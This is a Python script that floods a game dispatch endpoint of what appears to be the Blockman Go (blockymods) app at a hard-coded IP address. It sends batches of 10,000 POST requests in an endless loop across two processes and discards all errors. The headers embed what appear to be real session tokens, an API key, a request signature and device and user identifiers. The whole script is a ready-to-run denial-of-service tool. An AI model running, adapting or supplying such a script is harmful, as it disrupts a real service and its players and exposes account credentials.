import asyncio
import multiprocessing

import aiohttp
import uvloop

headers = {"x-shahe-uid":"8878880","x-shahe-token":"eyJhbGciOiJSUzI1NiJ9.eyJ1aWQiOjg4Nzg4ODAsImd0eXBlIjoiZzEwMDgiLCJpc3MiOiI4ODc4ODgwIiwiZXhwIjoxNzQwMTQ1NDk1fQ.mkiuu-dIZH9K4jsA1lOOaPkCAzJf22k2dKieYdfRXciF4nEHpSnAqEgP9MYcltXCAWdTOkQXQN2YcejtalAtQC7ovL13hfSzDApFrUErBgFdYlI8rb6AHLYCKoIMwvg7SNiU6n1zby8q4tJF6RuFj9LBbQUA_QAcfVvf8ywVE8kfdEuJYJOtsMhnA_5tjbXsLmfBMhyikZ12HlMvyuPPnfT1Es5glcNxQ2HWpe3SZLwCrplyJJS0AXqZfYZ5zIehszApmVKZwS_fILj7mlLlo9S8DjNXwSRg_VGxTqT8IM_LEiQv1D0cW5bHBSFnAoCgwwBbMHw6vgDTJWGUqsHd9g","userId":"8878880","packageName":"blockymods","packageNameFull":"com.sandboxol.blockymods","androidVersion":"30","OS":"android","appType":"android","appLanguage":"en","appVersion":"5221","appVersionName":"2.105.1","channel":"sandbox","uid_register_ts":"1520827184","device_register_ts":"1718718484","eventType":"app","userDeviceId":"f214e1d788c7df93","userLanguage":"en_US","region":"RU","clientType":"client","env":"prd","package_name_en":"com.sandboxol.blockymods","md5":"5d0de77b0f4b93b44669f146e54b49d9","X-ApiKey":"6aDtpIdzQdgGwrpP6HzuPA","X-Nonce":"c928cdea-009e-40e4-8602-660fae12e224","X-Time":"1740144902","X-Sign":"92194dfbaa2fad8fc33ffacac8c04c74","X-UrlPath":"/v1/dispatch","Access-Token":"ELPJaCzz5+V0e25U08NkzF3yNgcLHlLBeYSU4fJvPkMlGgTzfEqXwTRlW++nSbW0yqO79had4Hq4R/5FK02XjtJqI2pQWQRza5HTTEs7opFD/Tr7rfSZDezZVB+qTLzbAHYddMZsbuEaohYSUbgaCk/151hcyIABmeqtwX8VsGOlfO2EjRPSFgnM12473qMGEwFOHNZnI6ST5Lh5FBo4zlLe/EMzesVWWOvJ3eVw0y1xuDJ7/oFlcb8H4mAUV0HUXsZ1uWlQPe/Kt9kXtrtjjyfHHfgRtTOE6ukhajwXr50+S8TCFH5cTpLEjHJZsxBbiENZN2jEEsYN58KP39iglQ==","Content-Type":"application/json; charset=UTF-8","Content-Length":"299","Host":"130.61.18.134:9902","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"okhttp/4.11.0"}

data = {"country":"RU","targetId":8878880,"appVer":"5221","retryCount":0,"excludeIps":[""],"pioneer":True,"rid":8029,"clz":0,"ever":10109,"picUrl":"http://staticgs.sandboxol.com/sandbox/avatar/1722350941634476.jpg","clientType":1,"name":"NULLОWNS","mapId":"m1008_2","packageName":"blockymods","lang":"en"}

async def run():
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0)) as session:
        while True:
            tasks = [session.post("http://130.61.18.134:9902/v1/dispatch", headers=headers, json=data) for _ in range(10000)]
            try:
                await asyncio.gather(*tasks)
            except:
                pass

def main():
    uvloop.run(run())

for _ in range(2):
    multiprocessing.Process(target=main).start()
